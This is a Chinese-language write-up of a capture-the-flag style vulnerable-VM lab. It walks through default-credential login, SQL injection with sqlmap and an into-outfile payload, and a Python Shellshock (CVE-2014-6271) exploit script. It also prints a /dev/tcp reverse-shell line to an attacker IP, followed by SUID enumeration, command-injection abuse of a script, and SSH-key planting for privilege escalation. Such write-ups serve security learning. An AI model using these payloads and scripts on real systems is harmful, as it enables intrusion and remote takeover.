nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221135760.png)

---

首页有个彩蛋`<img src="images/logo.png" onclick="eEgg_func()" width="100" height="100">`,点击够一定次数把一个网页弹出来,好像没啥用qwq

```JavaScript
<script>
var old_time = 0;
var count = 1;
var eEgg_flag = false;

var modal = document.getElementById('eEgg_modal');
var footer = document.getElementById('footer');

function eEgg_func(){
    var d = new Date();
    var n = d.getTime();
    var new_time = Math.ceil(n/1000);

    if ((new_time - old_time) <= 1) {
        count++;
    }
    else {
        count = 1;
    }
    old_time = new_time;

    if (count > 7 && !eEgg_flag) {
        modal.style.display = "block";
        eEgg_flag = true;

        // Timeout
        setTimeout(function () {
            modal.style.display = "none";
        }, 21000);

        //Timeout text display in the footer
        var now = new Date().getTime();
        var countDownDate = now + 21000;

        setInterval(function() {
          // Get todays date and time
          var now = new Date().getTime();

          // Find the distance between now an the count down date
          var distance = countDownDate - now;

          // Time calculations for seconds
          var seconds = Math.floor((distance % (1000 * 60)) / 1000);

          // Display the result in the element with id="demo"
          document.getElementById("footer").innerHTML =
                            "Going back in "+ seconds + "s...";
        }, 1000);
    }
}
</script>
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221134772.png)

xray扫描出有个`readme.md`

```md
...
将文件夹 [net-banking](https://github.com/zakee94/online-banking-system/tree/master/net-banking) 或其中的文件复制到本地主机的位置。例如“/var/www/html”，Ubuntu 中 localhost 的位置。

将 [net_banking.sql](https://github.com/zakee94/online-banking-system/blob/master/net_banking.sql) 数据库导入您的 MySQL 设置。

编辑文件 [connect.php](https://github.com/zakee94/online-banking-system/blob/master/net-banking/connect.php) 并为您的 MySQL 设置提供正确的用户名和密码。

打开浏览器并通过访问主页测试设置是否有效。在浏览器中输入“localhost/home.php”作为访问主页的 URL。

管理员和客户的所有密码和用户名都可以在数据库中找到，即在文件 [net_banking.sql](https://github.com/zakee94/online-banking-system/blob/master/net_banking .sql）。

但是，下面提供了一些重要的用户名和密码：
* admin 的用户名为“admin”，密码为“password123”。
* 大多数客户的用户名是他们的“first_name”，密码是他们的“first_name”，后跟“123”。
...
```

在作者的github仓库里面找到了数据库中存在的默认用户[https://github.com/zakee94/online-banking-system/blob/master/net_banking.sql#L202](https://github.com/zakee94/online-banking-system/blob/master/net_banking.sql#L202)

用户名`salman`,密码`salman123`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221139262.png)

在[http://192.168.56.106/customer_transactions.php](http://192.168.56.106/customer_transactions.php)里面的`filter`存在注入点

`1' union select 1,2,3,4,5,6#`正常回显

sqlmap开跑

`requests.txt`

```
POST /customer_transactions.php HTTP/1.1
Host: 192.168.56.106
Content-Length: 33
Cache-Control: max-age=0
Origin: http://192.168.56.106
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.106/customer_transactions.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=jukdfmgi0kkp5adi3fu208fv5r
Connection: close

search_term=1&date_from=&date_to=
```

`sqlmap -r request.txt -p 'search_term' -v 3 --technique U --random-agent --prefix "'" --suffix "#" --union-cols 6`

可以进行文件读写

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221332763.png)

`1' union select 1,'<?php phpinfo();?>',3,4,5,6 into outfile '/tmp/a'#`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221409409.png)

但是`/var/www/html`目录可读不可写...

`http://192.168.56.106/admin_login.php`以`admin`和`password123`成功登录

读取`/var/www/html/connect.php`文件

```php
<?php
$servername = "localhost";
// Enter your MySQL username below(default=root)
$username = "thor";
// Enter your MySQL password below
$password = "password";
$dbname = "hacksudo";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    header("location:connection_error.php?error=$conn->connect_error");
    die($conn->connect_error);
}
?>
```

然而并不能直接进行ssh连接

`dirsearch`扫出来有个`cgi-bin`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221441430.png)

去瞄了眼wp,`cgi-bin`下有个`shell.sh`,推测利用方式为`cve-2014-6271`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221454889.png)

用我之前写过的一个脚本去利用

```python
import requests

url = "http://192.168.56.106/cgi-bin/shell.sh"


def shell(cmd):
    headers = {'User-Agent': "() { :; }; echo; echo; /bin/bash -c '%s'" % cmd}
    r = requests.get(url=url, headers=headers, proxies=proxies)
    print(r.text)


if __name__ == '__main__':
    shell('whoami')
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221459802.png)

`sh -i >& /dev/tcp/192.168.43.185/9001 0>&1`成功反弹

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221525806.png)

`python3 -c 'import pty;pty.spawn("/bin/bash")'`转换成可交互shell

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221527135.png)

```
find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

存在命令执行

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221533321.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221534057.png)

```sh
cat hammer.sh
#!/bin/bash
echo
echo "HELLO want to talk to Thor?"
echo 

read -p "Enter Thor  Secret Key : "  key
read -p "Hey Dear ! I am $key , Please enter your Secret massage : " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221535818.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221537584.png)

在`/home/thor/.ssh/authorized_keys`写个公钥

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221544838.png)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221549404.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221549267.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202221551447.png)